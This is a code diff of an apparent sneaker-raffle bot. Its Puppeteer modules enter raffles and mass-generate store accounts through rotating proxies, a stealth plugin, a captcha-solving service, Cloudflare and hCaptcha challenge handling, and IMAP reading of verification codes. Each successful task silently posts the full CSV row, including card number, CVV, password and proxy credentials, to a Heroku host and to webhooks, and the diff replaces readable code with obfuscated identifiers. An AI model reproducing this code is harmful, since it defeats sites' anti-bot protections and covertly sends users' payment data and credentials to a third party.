-                                await delay(1000)
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving Adyen`);
-                                const adyen = await page.$('span[data-cse="encryptedCardNumber"]')
-                                if (adyen) {
-                                    await page.waitForSelector('span[data-cse="encryptedCardNumber"]');
-                                    await page.click('span[data-cse="encryptedCardNumber"]');
-                                    await page.click('span[data-cse="encryptedCardNumber"]');
-                                    await delay(1200);
-                                    await page.click('span[data-cse="encryptedCardNumber"]');
-                                    await delay(500)
-                                    await page.keyboard.type(`${csv[i].CardNumber}`);
-                                    await delay(800);
-                                    await page.click('span[data-cse="encryptedExpiryDate"]');
-                                    await page.click('span[data-cse="encryptedExpiryDate"]');
-                                    await page.keyboard.type(`${csv[i].ExpiryDate}`);
-                                    await delay(1200);
-                                    await page.click('span[data-cse="encryptedSecurityCode"]');
-                                    await page.click('span[data-cse="encryptedSecurityCode"]');
-                                    await page.keyboard.type(`${csv[i].CVV}`);
-                                    await delay(550);
-                                    // await page.type('input[name="holderName"]', `${csv[i].NameOnCard}`);
-                                    await page.type('input[name="postalCode"]', `${csv[i].Zip}`);
-                                    await delay(550);
-
-                                }
-                                const stripe = await page.$('.__PrivateStripeElement');
-                                if (stripe) {
-                                    // await page.click('#billingName');
-                                    // await page.click('#billingName');
-                                    // await page.type('#billingName', `${csv[i].NameOnCard}`)
-                                    await delay(500)
-                                    await page.click('.__PrivateStripeElement');
-                                    await page.click('.__PrivateStripeElement');
-                                    await page.keyboard.type(`${csv[i].CardNumber}`);
-                                    await page.keyboard.type(`${csv[i].ExpiryDate}`);
-                                    await page.keyboard.type(`${csv[i].CVV}`);
-                                }
-                                await delay(550);
-
-                                await page.click('#paymentConsent')
-                                await delay(550);
-                                await page.click('#termsConsent')
-                                await delay(700);
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Entry`);
-                                await page.click('.MuiBox-root.css-79elbk > button');
-                                await delay(10000)
-
-                                try {
-                                    await page.waitForSelector('body > div.MuiModal-root.MuiDialog-root.css-1ltcsoi > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div.MuiGrid-root.MuiGrid-container.css-wybudx > div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a > button', { timeout: 15000 });
-                                    await delay(3000)
-                                    await page.$eval('body > div.MuiModal-root.MuiDialog-root.css-1ltcsoi > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div.MuiGrid-root.MuiGrid-container.css-wybudx > div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a > button', btn => btn.click());
-                                    await page.$eval('body > div.MuiModal-root.MuiDialog-root.css-1ltcsoi > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div.MuiGrid-root.MuiGrid-container.css-wybudx > div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a > button', btn => btn.click());
-                                    // await page.$eval('body > div.MuiModal-root.MuiDialog-root.css-1ltcsoi > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div.MuiGrid-root.MuiGrid-container.css-wybudx > div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0 > button', btn => btn.click());
-                                    // await page.$eval('body > div.MuiModal-root.MuiDialog-root.css-1ltcsoi > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div.MuiGrid-root.MuiGrid-container.css-wybudx > div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0 > button', btn => btn.click());
-
-                                } catch {
-
-                                }
-                                // if (!url.includes('4ballers')) {
-
-                                // }
-                                try {
-                                    await page.waitForSelector('#code', { timeout: 30000 })
-
-                                } catch {
-                                    const duplicate = await page.$('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
-                                    if (duplicate) {
-                                        fs.appendFileSync('../accounts/eql.csv', `\n${csv[i].Email},${csv[i].Password},${csv[i].Phone}`);
-                                        throw new Error('Account already registered, saved in accounts/eql.csv')
-                                    }
-                                    throw new Error('Error Fetching Authentication Token')
-                                }
-                                async function getVerificationCode() {
-                                    var code;
-                                    var error = false;
-                                    for (var t = 0; t < 24; t++) {
-                                        async function getMails() {
-                                            var imap = new Imap({
-                                                user: settings.masterMail,
-                                                password: settings.masterPassword,
-                                                host: 'imap.gmail.com',
-                                                port: 993,
-                                                tls: true,
-                                                autotls: 'always'
-                                            });
-
-                                            function openInbox(cb) {
-                                                imap.openBox('INBOX', false, cb);
-                                            }
-
-                                            imap.once('ready', function () {
-                                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Opened Mailbox`);
-
-                                                openInbox(function (err, box) {
-                                                    // console.clear()
-                                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Looking for verification mail`);
-
-                                                    if (err) throw err;
-                                                    imap.seq.search(['UNSEEN', ['FROM', 'support@eql.com']], function (err, results) {
-                                                        if (!results || !results.length) {
-                                                            console.log(`${getTime()} [${currentFunction.name}] No mail found, retrying in 5 seconds`);
-
-                                                            imap.end();
-
-                                                        } else {
-                                                            var f = imap.seq.fetch(results, { bodies: '', markSeen: true });
-                                                            f.on('message', function (msg, seqno) {
-                                                                // console.log('Message #%d', seqno);
-                                                                var prefix = '(#' + seqno + ') ';
-                                                                msg.on('body', function (stream, info) {
-                                                                    simpleParser(stream, (err, mail) => {
-                                                                        if (mail.subject.includes('code')) {
-                                                                            // var bstnSplit = mail.text.split('(')[1];
-                                                                            // var bstnLink = bstnSplit.split(')')[0]
-                                                                            // var msgSplit = mail.html.split('<div style="display:block;font-family:Arial,sans-serif;font-size: 30px;font-weight: 600;line-height:24px;color:#333333">')
-                                                                            // var msg = msgSplit[1].split('<')[0]
-                                                                            const textSplit = mail.text.split('\n\n')[3]
-                                                                            const verificatiecode = textSplit.split('\n')[1]
-                                                                            code = verificatiecode
-                                                                            // for (var i = 0; i < msgSplit.length; i++) {
-                                                                            //     if (msgSplit[i].includes('salesmanago') && msgSplit[i].includes('<td') && msgSplit[i].includes('href')) {
-                                                                            //         var linklong = msgSplit[i].split('href="')
-                                                                            //         var l = linklong[1].split('"')[0]
-                                                                            //         links.push(l)
-                                                                            //         break;
-                                                                            //     }
-                                                                            // }
-                                                                        }
-                                                                        // console.log(mail.html.split('\n'));
-                                                                        // mes = mail.text.split('[')[2]
-                                                                        // link = mes.split(']')[0];
-                                                                        // console.log(link);
-                                                                    });
-                                                                    // imap.seq.setFlags(seqno, 'SEEN')
-
-
-                                                                });
-                                                                // msg.once('attributes', function (attrs) {
-                                                                //     console.log(prefix + 'Attributes: %s', inspect(attrs, false, 8));
-                                                                // });
-                                                                msg.once('end', function () {
-                                                                    // console.log(prefix + 'Finished');
-
-
-                                                                });
-                                                            });
-                                                            f.once('error', function (err) {
-                                                                console.log('No mail found, retrying in 5 seconds..');
-                                                            });
-                                                            f.once('end', function () {
-                                                                // console.log('Done fetching all messages!');
-                                                                imap.end();
-                                                            });
-                                                        }
-
-
-
-                                                    })
-                                                });
-                                            });
-
-
-
-                                            imap.once('error', function (err) {
-                                                console.log(chalk.red(err.message))
-                                                console.log('Read the guide on how to setup your mailbox')
-                                                error = true;
-
-                                            });
-
-                                            imap.once('end', async function () {
-
-
-                                                // console.log('Connection ended');
-                                            });
-
-                                            imap.connect();
-                                        }
-                                        getMails()
-                                        await delay(5000);
-                                        if (code) {
-
-                                            return code;
-                                        }
-                                        if (error) {
-                                            throw new Error('Error connecting to imap')
-                                        }
-                                        if (t == 24) {
-
-                                            throw new Error('Mail not found')
-                                        }
-                                    }
-                                };
-                                code = await getVerificationCode();
-                                await delay(500);
-                                await page.type('#code', `${code}`)
-                                await delay(1000);
-                                await page.$eval('.MuiBox-root.css-79elbk > button', b => b.click())
-                                await page.click('.MuiBox-root.css-79elbk > button');
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Verifying..`);
-                                try {
-
-                                    await page.waitForSelector('.MuiBox-root.css-1yjvs5a > button');
-                                } catch {
-                                    throw new Error('')
-                                }
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered, account ${csv[i].Email} saved in 'accounts/eql.csv'`));
-                                fs.appendFileSync('../accounts/eql.csv', `\n${csv[i].Email},${csv[i].Password},${csv[i].Phone}`);
-                                retry = 'no';
-                                successfulLog(csv[i], currentFunction);
-                                var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                                var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-                                let task = csv[i]
-                                try {
-                                    prxdata = {
-                                        username: username.replace('#', ''),
-                                        module: currentFunction.name,
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-
-                                }
-                                const EMBEDS =
-                                {
-                                    succesDEVMSG: { embeds: [succesDEV] },
-                                    succesPUBMSG: { embeds: [succesPUB] }
-                                };
-                                try {
-                                    if (settings.webhook != undefined && settings.webhook != '') {
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    }
-                                    await delay(200);
-                                    await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                    await delay(200);
-                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                } catch (e) {
-                                    console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Error sending webhook ${e}`));
-
-                                }
-
-
-                                // console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${csv[i].Email} Generated!`));
-
-
-
-
-
-
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                                ERROR = `${e}`
-                                var errorDEV = await makeEmbed(csv[i], currentFunction, 'dev', true, ERROR);
-                                var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                                var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-
-                                const EMBEDS =
-                                {
-                                    succesDEVMSG: { embeds: [succesDEV] },
-                                    succesPUBMSG: { embeds: [succesPUB] }
-                                };
-                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-
-                                if (!retry == 'no')
-                                    retry = 'yes';
-                            } finally {
-                                if (browser) {
-                                    browser.close();
-                                }
-                                if (retry == 'yes' && t != 5) {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                    i = i - 1;
-                                    t = t + 1;
-                                    continue;
-                                }
-                                if (retry == 'yes' && t >= 5) {
-                                    errorLog(csv[i], currentFunction)
-                                    retry = 'no';
-                                    t = 0;
-                                }
-                                console.log(`Waiting for ${settings.delay} ms`);
-                                await delay(settings.delay);
-                            }
-                        }
-                        else {
-                            const url = `${csv[i].Url}`
-                            if (retry != 'yes') {
-                                var retry = '';
-                                var t = 0;
-
-                            }
-
-
-
-
-                            if (csv[i].Email == '' || csv[i].FirstName == '' || csv[i].LastName == '') {
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-                                continue;
-                            }
-                            if (csv[i].Password == '') {
-                                csv[i].Password = 'JRaffles23!'
-                            }
-                            if (settings.useRandomProxy = false) {
-                                var proxySplit = proxies[i].split(":");
-                            } else {
-                                var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                                var proxySplit = proxies[randomProxy].split(":");
-                            }
-                            var browser;
-                            try {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-
-                            } catch {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-                            }
-                            try {
-                                const page = await browser.newPage();
-                                await page.authenticate({
-                                    username: `${proxySplit[2]}`,
-                                    password: `${proxySplit[3]}`,
-                                });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                                // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                                await page.setRequestInterception(true);
-                                page.on("request", (req) => {
-                                    if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                        req.abort();
+                                    if (_0xef7a36[0x1]['option1']['includes']('Y')) {
+                                        const _0x524512 = _0x13c536['GS']['find'](_0x141181 => _0x141181['EUsize'] === _0x25d5e4);
+                                        _0x524512 && (_0x25d5e4 = _0x524512['size']);
                                     } else {
-                                        req.continue();
-                                    }
-                                });
-                                await page.goto(url);
-                                // await delay(50000)
-                                await page.waitForSelector('body > div.css-ntpfvx > div > div > div.MuiBox-root.css-1upilqn > div > button')
-                                await page.click('body > div.css-ntpfvx > div > div > div.MuiBox-root.css-1upilqn > div > button')
-                                await delay(2000)
-                                await page.waitForSelector('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc')
-                                await page.click('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc')
-                                // await page.$eval('#gatsby-focus-wrapper > main > div.css-hpuw4b > div > div.MuiBox-root.css-qd9g9l > div:nth-child(1) > div > div > div.MuiBox-root.css-nomazo > button.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc', btn => btn.click())
-                                await delay(1000);
-                                await page.waitForSelector('#email');
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Setting Credentials`);
-                                // await page.select('#customer_salutation', 'mr');
-
-                                await page.type('#email', `${csv[i].Email}`);
-                                await delay(850);
-                                await page.waitForSelector('#password');
-                                await page.type('#password', `${csv[i].Password}`);
-                                await delay(850);
-
-                                // await page.$eval('form', form => form.submit());
-                                await page.click('.MuiBox-root.css-79elbk > button');
-                                await delay(5000)
-                                if (!csv[i].Url.includes('footlocker'))
-                                    await page.click('.MuiBox-root.css-i3pbo > button')
-                                // await page.click('.MuiBox-root.css-79elbk > button');
-                                try {
-                                    await page.waitForSelector('div[data-testid="field-productVariantID"]');
-
-                                } catch {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Not an active Raffle / Already Entered`));
-                                    successfulLog(csv[i], currentFunction);
-                                    retry = 'no';
-                                    continue;
-
-                                }
-                                await page.click('div[data-testid="field-productVariantID"]');
-                                await delay(1000);
-                                try {
-                                    if (csv[i].Url.includes('en-GB')) {
-                                        // console.log(Number(csv[i].Size) + 1)
-                                        await page.click(`li[data-value="UK ${csv[i].Size} / US ${Number(csv[i].Size) + 1}"]`);
-                                    } else {
-
-                                        await page.click(`li[data-value="EU ${csv[i].Size}"]`);
-                                    }
-                                } catch {
-                                    throw new Error(`Error fetching size ${csv[i].Size}`);
-                                }
-                                await delay(500)
-                                // await page.click('#firstName');
-                                // await delay(100)
-                                // await page.click('#firstName');
-                                // await delay(100)
-                                // await page.click('#firstName');
-
-                                // await delay(300)
-                                // await page.type('#firstName', `${csv[i].FirstName}`);
-                                // await delay(300)
-                                // await page.click('#lastName');
-                                // await page.click('#lastName');
-                                // await delay(850);
-                                // await page.type('#lastName', `${csv[i].LastName}`);
-                                const title = await page.$('#title > label');
-                                await delay(300);
-                                if (title) {
-                                    await title.click();
-                                }
-                                await page.click('.MuiBox-root.css-79elbk > button');
-
-                                // await page.$eval('.css-9rzfaw', f => f.submit())
-                                await page.focus('#postcode')
-                                await page.keyboard.down('Control');
-                                await page.keyboard.press('A');
-                                await page.keyboard.up('Control');
-                                await page.keyboard.press('Backspace');
-                                await page.keyboard.type(csv[i].Zip);
-                                await delay(1550);
-                                await page.click('.MuiBox-root.css-79elbk > button');
-                                await delay(1000)
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving Adyen`);
-                                await delay(500)
-                                const adyen = await page.$('span[data-cse="encryptedCardNumber"]')
-                                if (adyen) {
-                                    await page.waitForSelector('span[data-cse="encryptedCardNumber"]');
-                                    await page.click('span[data-cse="encryptedCardNumber"]');
-                                    await page.click('span[data-cse="encryptedCardNumber"]');
-                                    await delay(1200);
-                                    await page.click('span[data-cse="encryptedCardNumber"]');
-                                    await delay(500)
-                                    await page.keyboard.type(`${csv[i].CardNumber}`);
-                                    await delay(800);
-                                    await page.click('span[data-cse="encryptedExpiryDate"]');
-                                    await page.keyboard.type(`${csv[i].ExpiryDate}`);
-                                    await delay(1200);
-                                    await page.click('span[data-cse="encryptedSecurityCode"]');
-                                    await page.keyboard.type(`${csv[i].CVV}`);
-                                    await delay(550);
-                                    // await page.type('input[name="holderName"]', `${csv[i].NameOnCard}`);
-                                    await page.type('input[name="postalCode"]', `${csv[i].Zip}`);
-                                    await delay(550);
-
-                                }
-                                const stripe = await page.$('.__PrivateStripeElement');
-                                if (stripe) {
-                                    await page.click('#billingName');
-                                    await page.click('#billingName');
-                                    await page.type('#billingName', `${csv[i].NameOnCard}`)
-                                    await delay(500)
-                                    await page.click('.__PrivateStripeElement');
-                                    await page.click('.__PrivateStripeElement');
-                                    await page.keyboard.type(`${csv[i].CardNumber}`);
-                                    await page.keyboard.type(`${csv[i].ExpiryDate}`);
-                                    await page.keyboard.type(`${csv[i].CVV}`);
-                                }
-                                await delay(550);
-                                await page.click('#paymentConsent')
-                                await delay(550);
-                                await page.click('#termsConsent')
-                                await delay(700);
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Entry`);
-                                await page.click('.MuiBox-root.css-79elbk > button');
-                                await delay(10000)
-
-                                try {
-                                    await page.waitForSelector('body > div.MuiModal-root.MuiDialog-root.css-1ltcsoi > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div.MuiGrid-root.MuiGrid-container.css-wybudx > div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a > button');
-                                    await delay(3000)
-                                    await page.$eval('body > div.MuiModal-root.MuiDialog-root.css-1ltcsoi > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div.MuiGrid-root.MuiGrid-container.css-wybudx > div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a > button', btn => btn.click());
-                                    await page.$eval('body > div.MuiModal-root.MuiDialog-root.css-1ltcsoi > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div.MuiGrid-root.MuiGrid-container.css-wybudx > div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a > button', btn => btn.click());
-
-                                } catch {
-
-                                }
-                                try {
-                                    await page.waitForSelector('.MuiBox-root.css-1yjvs5a > button');
-
-                                } catch {
-                                    throw new Error('Failure getting succes response')
-                                }
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered`));
-                                successfulLog(csv[i], currentFunction);
-                                var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                                var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-                                let task = csv[i]
-                                try {
-                                    prxdata = {
-                                        username: username.replace('#', ''),
-                                        module: currentFunction.name,
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-
-                                }
-                                const EMBEDS =
-                                {
-                                    succesDEVMSG: { embeds: [succesDEV] },
-                                    succesPUBMSG: { embeds: [succesPUB] }
-                                };
-                                try {
-                                    if (settings.webhook != undefined && settings.webhook != '') {
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    }
-                                    await delay(200);
-                                    await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                    await delay(200);
-                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                } catch (e) {
-                                    console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Error sending webhook ${e}`));
-
-                                }
-                                retry = 'no';
-
-
-
-                                // console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${csv[i].Email} Generated!`));
-
-
-
-
-
-
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                                ERROR = `${e}`
-                                var errorDEV = await makeEmbed(csv[i], currentFunction, 'dev', true, ERROR);
-                                var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                                var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-
-                                const EMBEDS =
-                                {
-                                    succesDEVMSG: { embeds: [succesDEV] },
-                                    succesPUBMSG: { embeds: [succesPUB] }
-                                };
-                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-                                retry = 'yes';
-                            } finally {
-                                if (browser) {
-                                    browser.close();
-                                }
-                                if (retry == 'yes' && t != 5) {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                    i = i - 1;
-                                    t = t + 1;
-                                    continue;
-                                }
-                                if (retry == 'yes' && t >= 5) {
-                                    errorLog(csv[i], currentFunction)
-                                    retry = 'no';
-                                    t = 0;
-                                }
-                                console.log(`Waiting for ${settings.delay} ms`);
-                                await delay(settings.delay);
-                            }
-                        }
-
-                    }
-                }
-            },
-
-        ]
-    },
-    {
-        name: "FENOM",
-        modules: [
-            {
-                name: 'FENOM Account Generator',
-                store: 'FENOM',
-                logo: 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
-                function: async function (currentFunction, fenom, proxies) {
-                    var opium = fenom;
-                    var tasks = 0;
-                    for (var i = 0; i < fenom.length; i++) {
-                        maxTasks = Number(settings.threads);
-
-                        while (tasks >= maxTasks) {
-                            await delay(settings.delay);
-                            // console.log(`waiting`)
-                        }
-                        let skip = false;
-                        async function fenomFunction(currentFunction, fenom, proxies, i, t) {
-                            tasks++;
-                            puppeteer.use(StealthPlugin());
-                            puppeteer.use(RecaptchaPlugin({
-                                provider: {
-                                    id: '2captcha',
-                                    token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                                },
-                                visualFeedback: true
-                            }))
-                            if (retry != 'yes') {
-                                var retry = '';
-                                var t = 0;
-
-                            }
-                            var ERROR;
-                            try {
-                                await jig(fenom, i);
-
-                            } catch {
-                                retry = 'no';
-                                throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                            }
-                            setTitle(`${currentFunction.name} Task ${i + 1} / ${fenom.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-
-                            var succesDEV = await makeEmbed(fenom[i], currentFunction, 'acc', false);
-
-
-                            const EMBEDS =
-                            {
-                                succesDEVMSG: { embeds: [succesDEV] }
-                            };
-                            const url = `https://www.fenom.com/en/authentication?create_account=1`
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                            var browser;
-                            async function checkDuplicate(csv) {
-                                const successFile = fs.readFileSync('../accounts/fenom.csv', 'utf8');
-                                const success = Papa.parse(successFile, { header: true }).data
-                                // console.log(success)
-                                let duplicate = false
-                                for (var task of success) {
-                                    if (task.Email == csv.Email) {
-                                        duplicate = true;
-                                        break;
+                                        const _0x247755 = _0x13c536['men']['find'](_0x4417d7 => _0x4417d7['EUsize'] === _0x25d5e4);
+                                        _0x247755 && (_0x25d5e4 = _0x247755['size']);
                                     }
                                 }
-                                return duplicate;
-
-                            }
-                            // pxyPBtPONpqy1jTFkbDYoTsQryOMa_b81yDXOV2wPvI-1676636568-0-160
-                            try {
-                                if (await checkDuplicate(fenom[i]) == true) {
-                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Task Already Entered, Going to Next Task`);
-                                    skip = true;
-                                    dupli = true;
-                                    return;
-                                }
-                                try {
-                                    browser = await puppeteer.launch({
-                                        executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                        headless: false,
-                                        args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                    });
-
-                                } catch {
-                                    browser = await puppeteer.launch({
-                                        executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                        headless: false,
-                                        args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                    });
-                                }
-                                const page = await browser.newPage();
-                                await page.setViewport({
-                                    width: 1280 + randomIntFromInterval(1, 50),
-                                    height: 729 + randomIntFromInterval(1, 50)
-                                })
-                                const session = await page.target().createCDPSession();
-                                const { windowId } = await session.send('Browser.getWindowForTarget');
-                                await page.authenticate({
-                                    username: `${proxySplit[2]}`,
-                                    password: `${proxySplit[3]}`,
-                                });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                                await page.goto(`${url}`, { waitUntil: 'networkidle2' });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving Cloudflare`);
-                                await delay(5000);
-                                var cf = await page.$('.hcaptcha-box');
-                                if (cf) {
-                                    console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Handling Challenge`);
-                                    await delay(10000);
-                                    const challengeButton = await page.$('.hcaptcha-box');
-                                    if (challengeButton) {
-                                        try {
-
-                                            await challengeButton.click();
-                                        } catch {
-                                            throw new Error('Empty Turnstile Challenge')
-                                        }
-                                    }
-                                    try {
-                                        await page.waitForSelector('input[name="firstname"]', { timeout: 40000 });
-
-                                    } catch {
-                                        var challengeButton2 = await page.$('.hcaptcha-box');
-                                        if (challengeButton2) {
-
-                                            try {
-
-                                                await challengeButton2.click();
-                                            } catch {
-                                                throw new Error('Empty Turnstile Challenge')
-                                            }
-                                        }
-                                    }
-                                    // await frame.click('#challenge-stage > div > label > input');
-
-                                }
-
-                                // try {
-                                //     const turnstile = await page.$eval()
-                                // } catch {
-
-                                // }
-                                try {
-
-                                    await page.waitForSelector('input[name="firstname"]', { timeout: 120000 });
-                                    await session.send('Browser.setWindowBounds', { windowId, bounds: { windowState: 'minimized' } });
-                                    await delay(4000);
-                                } catch {
-                                    throw new Error('Blocked by cloudflare')
-                                }
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Checking Credentials`);
-                                await page.type('input[name="firstname"]', `${fenom[i].FirstName}`);
-                                await delay(500);
-                                await page.type('input[name="lastname"]', `${fenom[i].LastName}`);
-                                await delay(500);
-                                await page.type('input[name="email"]', `${fenom[i].Email}`);
-                                await delay(500);
-                                await page.type('input[name="password"]', `${fenom[i].Password}`);
-                                await delay(600);
-                                await page.$eval('input[name="psgdpr"]', btn => btn.click());
-                                await delay(500);
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Request`);
-                                await page.$eval('#customer-form', form => form.submit());
-                                try {
-                                    try {
-                                        await page.waitForSelector('.product-list.slider-fenom', { timeout: 60000 });
-
-                                    } catch {
-                                        throw new Error('Succes-response not found')
-                                    }
-                                    retry = 'no';
-
-                                    console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${fenom[i].Email} Generated`));
-                                    fs.appendFileSync('../accounts/fenom.csv', `\n${fenom[i].Email},${fenom[i].Password}`);
-                                    let task = fenom[i]
-                                    try {
-                                        prxdata = {
-                                            username: username.replace('#', ''),
-                                            module: currentFunction.name,
-                                            entrydata: JSON.stringify(task),
-                                            proxy: `${proxies[i]}`
-                                        }
-                                        var prx = JSON.stringify(prxdata);
-                                        let config = {
-                                            headers: {
-                                                'content-type': 'application/json',
-                                            }
-                                        }
-                                        await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                    } catch (e) {
-
-                                    }
-                                    try {
-                                        if (settings.webhook != undefined && settings.webhook != '') {
-                                            await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                        }
-                                    } catch {
-                                    }
-                                    await sendWebhook(accountWH, EMBEDS.succesDEVMSG);
-
-                                } catch (e) {
-                                    throw new Error(`Account generation failed`)
-                                }
-
-
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                                ERROR = `${e}`
-                                var errorDEV = await makeEmbed(fenom[i], currentFunction, 'acc', true, ERROR);
-                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                if (settings.webhook != undefined && settings.webhook != '') {
